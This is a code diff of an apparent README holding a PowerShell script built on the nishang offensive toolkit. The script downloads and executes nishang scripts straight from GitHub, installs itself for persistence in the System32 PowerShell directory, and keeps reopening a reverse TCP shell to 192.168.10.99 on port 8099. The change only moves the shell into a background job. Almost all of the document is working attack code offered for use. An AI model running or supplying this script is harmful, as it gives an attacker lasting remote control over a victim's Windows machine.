@@ -17,8 +17,6 @@ powered by [nishang](https://github.com/samratashok/nishang)
 
 ### 1.ps1
 ```
-IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1')
-
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Add-Persistence.ps1')
 Add-Persistence -ScriptPath C:\Windows\System32\WindowsPowerShell\v1.0\1.ps1
 
@@ -35,11 +33,16 @@ If (Test-Path $strFileName){
 
 While(1){
 	Try {
-		Invoke-PowerShellTcp -Reverse -IPAddress 192.168.10.99 -Port 8099
+		start-job {
+			IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');
+			Invoke-PowerShellTcp -Reverse -IPAddress 192.168.10.99 -Port 8099
+		}
+		get-job | wait-job
 	}
 	Catch {
 		Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
 	}
 	Start-Sleep -Seconds 3
 }
+
 ```
